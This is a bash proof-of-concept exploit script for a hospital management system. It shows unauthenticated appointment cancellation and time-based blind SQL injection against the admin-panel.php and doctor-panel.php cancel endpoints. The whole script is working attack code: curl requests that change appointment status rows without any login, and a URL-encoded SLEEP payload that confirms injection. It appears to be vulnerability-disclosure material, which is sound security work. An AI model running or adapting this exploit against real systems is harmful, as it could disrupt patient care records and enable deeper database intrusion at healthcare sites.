#!/usr/bin/env bash
# Hospital-Management-System Appointment Cancellation SQL Injection - PoC
# Package: hms-panel-update-sqli (HMS-01 admin-panel.php:71, HMS-03 doctor-panel.php:8)
# Targets: GET /admin-panel.php?cancel=1&ID=<inj>, GET /doctor-panel.php?cancel=1&ID=<inj>
# Usage: ./poc.sh http://<target-host>[:port]
# Harmless payloads only: numeric constant oracle (SELECT 858)>(SELECT SLEEP(1)); no data extraction.

BASE="${1:-http://localhost:8000}"
PAYLOAD="999%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-"

echo "[*] HMS-01: unauthenticated cancel (no Cookie header) - flips userStatus 1->0 for row 4"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' "$BASE/admin-panel.php?cancel=1&ID=4"
# verify in DB: SELECT ID,userStatus FROM appointmenttb WHERE ID=4;   (expect userStatus=0)

echo "[*] HMS-01: baseline vs time-based blind (admin-panel.php)"
curl -s -o /dev/null -w '    baseline ID=999           status=%{http_code} time=%{time_total}s\n' "$BASE/admin-panel.php?cancel=1&ID=999"
curl -s -o /dev/null -w '    payload  (SLEEP oracle)    status=%{http_code} time=%{time_total}s\n' "$BASE/admin-panel.php?cancel=1&ID=$PAYLOAD"
# expect: payload time ~= number of appointmenttb rows x 1s (12 seeded rows -> ~12s)

echo "[*] HMS-03: unauthenticated cancel (no Cookie header) - flips doctorStatus 1->0 for row 2"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' "$BASE/doctor-panel.php?cancel=1&ID=2"
# verify in DB: SELECT ID,doctorStatus FROM appointmenttb WHERE ID=2; (expect doctorStatus=0)

echo "[*] HMS-03: baseline vs time-based blind (doctor-panel.php)"
curl -s -o /dev/null -w '    baseline ID=999           status=%{http_code} time=%{time_total}s\n' "$BASE/doctor-panel.php?cancel=1&ID=999"
curl -s -o /dev/null -w '    payload  (SLEEP oracle)    status=%{http_code} time=%{time_total}s\n' "$BASE/doctor-panel.php?cancel=1&ID=$PAYLOAD"
